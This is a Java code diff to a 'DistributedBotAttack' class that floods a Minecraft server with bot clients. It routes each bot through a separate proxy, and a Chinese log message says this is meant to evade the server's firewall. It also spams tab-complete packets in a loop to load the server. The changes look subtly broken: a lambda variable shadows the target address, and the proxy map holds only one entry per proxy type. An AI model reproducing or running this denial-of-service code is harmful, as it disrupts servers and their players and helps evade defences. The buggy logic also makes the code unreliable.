@@ -12,6 +12,7 @@ import org.spacehq.packetlib.tcp.TcpSessionFactory;
 import java.net.InetSocketAddress;
 import java.net.Proxy;
 import java.util.List;
+import java.util.Map;
 import java.util.Random;
 
 public class DistributedBotAttack extends Util {
@@ -21,11 +22,11 @@ public class DistributedBotAttack extends Util {
     private static int time;
     private static int maxAttack;
     private static int sleepTime;
-    private static List<String> ips;
+    private static Map<Proxy.Type,String> ips;
     private static boolean enableTab;
 
 
-    public DistributedBotAttack(String ip, int port, int time, int maxAttack, int sleepTime, List<String> ips, boolean enableTab) {
+    public DistributedBotAttack(String ip, int port, int time, int maxAttack, int sleepTime, Map<Proxy.Type,String> ips, boolean enableTab) {
         this.ip = ip;
         this.port = port;
         this.time = time;
@@ -39,18 +40,20 @@ public class DistributedBotAttack extends Util {
 
         if (maxAttack > ips.size()) {
             log("请提供代理数大于最大连接数，出于绕过服务器防火墙机制，1个ip只连接一个");
+            log("当前代理数：" + ips.size());
             return false;
         }
 
-        for (int t = 0; t < maxAttack; t++) {
-            int finalT = t;
+        ips.forEach((type,ip) -> {
+
+
             new Thread(() -> {
-                String pip = ips.get(finalT).split(":")[0];
-                int pport = Integer.parseInt(ips.get(finalT).split(":")[1]);
-                Proxy proxy = new Proxy(Proxy.Type.HTTP,new InetSocketAddress(pip,pport));
+
+                String pip = ip.split(":")[0];
+                int pport = Integer.parseInt(ip.split(":")[1]);
+                Proxy proxy = new Proxy(type,new InetSocketAddress(pip,pport));
                 MinecraftProtocol protocol = new MinecraftProtocol(getRandomString(new Random().nextInt(8)%(8-4+1) + 4));
                 Client mc = new Client(ip,port,protocol,new TcpSessionFactory(proxy));
-                mc.getSession().connect();
                 mc.getSession().addListener(new SessionListener() {
                     @Override
                     public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
@@ -61,8 +64,14 @@ public class DistributedBotAttack extends Util {
 
                             if (enableTab) {
                                 new Thread(() -> {
-                                    while (mc.getSession().isConnected())
-                                    mc.getSession().send(new ClientTabCompletePacket("/"));
+                                    while (mc.getSession().isConnected()) {
+                                        mc.getSession().send(new ClientTabCompletePacket("/"));
+                                        try {
+                                            Thread.sleep(1);
+                                        } catch (InterruptedException e) {
+                                            e.printStackTrace();
+                                        }
+                                    }
                                 }).start();
 
                             }
@@ -87,10 +96,19 @@ public class DistributedBotAttack extends Util {
 
                     @Override
                     public void disconnected(DisconnectedEvent disconnectedEvent) {
-
+                        log("断开连接：" +disconnectedEvent.getReason());
+                        //mc.getSession().connect();
                     }
                 });
+                mc.getSession().connect();
             }).start();
+
+        });
+
+        try {
+            Thread.sleep(sleepTime);
+        } catch (InterruptedException e) {
+            e.printStackTrace();
         }
         return true;
 
